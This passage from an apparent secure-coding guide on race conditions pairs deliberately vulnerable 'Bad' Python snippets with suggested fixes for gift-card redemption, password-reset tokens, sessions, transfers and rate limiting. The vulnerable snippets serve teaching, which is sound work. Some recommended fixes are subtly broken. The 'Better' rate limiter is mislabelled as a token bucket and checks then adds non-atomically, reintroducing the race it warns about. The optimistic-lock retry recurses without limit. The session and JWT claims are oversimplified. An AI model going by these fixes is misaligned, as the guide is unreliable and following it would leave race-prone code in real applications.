        return "Already redeemed"
    
    # Update with version check
    result = db.session.query(GiftCard).filter_by(
        code=card_code,
        version=original_version
    ).update({
        'redeemed': True,
        'version': GiftCard.version + 1
    })
    
    if result == 0:
        # Another thread updated first
        db.session.rollback()
        return "Concurrency conflict"
    
    db.session.commit()
```

### Strategy 3: Avoid mixing data sources

**Bad - Mixing session and database:**
```python
# Store reset token in session
session['reset_token'] = generate_token()
session['reset_user'] = username

# Later: Validate from session
if session['reset_token'] == provided_token:
    user = User.query.filter_by(username=session['reset_user']).first()
    user.set_password(new_password)

# Race: Two resets can overwrite session['reset_token']
```

**Good - Single source of truth:**
```python
# Store token in database only
token_record = PasswordResetToken(
    user_id=user.id,
    token=generate_token(),
    expires_at=datetime.now() + timedelta(hours=1)
)
db.session.add(token_record)
db.session.commit()

# Later: Validate from database
token_record = PasswordResetToken.query.filter_by(
    token=provided_token,
    used=False
).first()

if token_record and token_record.expires_at > datetime.now():
    user = User.query.get(token_record.user_id)
    user.set_password(new_password)
    token_record.used = True
    db.session.commit()
```

### Strategy 4: Session consistency

**Bad - Individual updates:**
```python
# Updating session variables one by one
session['user_id'] = user.id  # ← Sub-state begins
# Race window here!
session['is_admin'] = user.is_admin  # ← Sub-state ends
```

**Good - Batch updates:**
```python
# Update all at once
session.update({
    'user_id': user.id,
    'is_admin': user.is_admin,
    'mfa_verified': False
})
```

**Best - Framework support:**
```python
# Django: Uses batched session updates by default
request.session['user_id'] = user.id
request.session['is_admin'] = user.is_admin
# Both written together when request completes
```

### Strategy 5: Use database transactions properly

**Bad - Separate queries:**
```python
balance = get_balance(account_id)

if balance >= amount:
    deduct_balance(account_id, amount)
    add_to_recipient(recipient_id, amount)
```

**Good - Transaction with locking:**
```python
with db.transaction():
    # Lock row during transaction
    account = Account.query.filter_by(id=account_id).with_for_update().first()
    
    if account.balance < amount:
        raise InsufficientFunds
    
    account.balance -= amount
    
    recipient = Account.query.filter_by(id=recipient_id).with_for_update().first()
    recipient.balance += amount
    
    db.session.commit()

# If another thread tries to access during transaction:
# with_for_update() causes it to wait until commit
```

**SQL transaction example:**
```sql
START TRANSACTION;

-- Lock both rows
SELECT balance FROM accounts WHERE id = 123 FOR UPDATE;
SELECT balance FROM accounts WHERE id = 456 FOR UPDATE;

-- Update atomically
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
UPDATE accounts SET balance = balance + 100 WHERE id = 456;

COMMIT;
```

### Strategy 6: Implement proper locking

**Pessimistic locking (lock before reading):**
```python
from sqlalchemy import select

with db.transaction():
    # Lock row before reading
    stmt = select(GiftCard).where(GiftCard.code == code).with_for_update()
    card = db.session.execute(stmt).scalar_one()
    
    if card.redeemed:
        return "Already redeemed"
    
    card.redeemed = True
    db.session.commit()
```

**Optimistic locking (detect conflicts after):**
```python
class GiftCard(db.Model):
    code = db.Column(db.String(50))
    redeemed = db.Column(db.Boolean)
    version = db.Column(db.Integer)

# Try update
original_version = card.version
card.redeemed = True
card.version += 1

# Check if anyone else modified
rows_updated = db.session.query(GiftCard).filter_by(
    code=code,
    version=original_version
).update({'redeemed': True, 'version': card.version})

if rows_updated == 0:
    # Conflict detected, retry
    db.session.rollback()
    return redeem_gift_card(code)  # Retry
```

### Strategy 7: Rate limiting (properly implemented)

**Bad - Check then increment:**
```python
attempts = get_attempts(ip)
if attempts >= limit:
    return "Rate limited"
increment_attempts(ip)  # Race window!
```

**Good - Atomic increment:**
```python
# Redis atomic increment
attempts = redis.incr(f"rate_limit:{ip}")

if attempts > limit:
    return "Rate limited"

# Set expiry on first attempt
if attempts == 1:
    redis.expire(f"rate_limit:{ip}", 60)
```

**Better - Token bucket algorithm:**
```python
import time

def check_rate_limit(ip):
    key = f"rate_limit:{ip}"
    now = time.time()
    
    # Use Redis sorted set
    # Remove old attempts (outside window)
    redis.zremrangebyscore(key, 0, now - 60)
    
    # Count attempts in last 60 seconds
    attempts = redis.zcard(key)
    
    if attempts >= limit:
        return False
    
    # Add this attempt atomically
    redis.zadd(key, {str(now): now})
    redis.expire(key, 60)
    
    return True
```

### Strategy 8: Avoid server-side state (when appropriate)

**Instead of sessions:**
```python
# Use JWTs (stateless)
token = jwt.encode({
    'user_id': user.id,
    'is_admin': user.is_admin,
    'exp': datetime.utcnow() + timedelta(hours=1)
}, secret_key)

# No server-side state = no race conditions on sessions
```
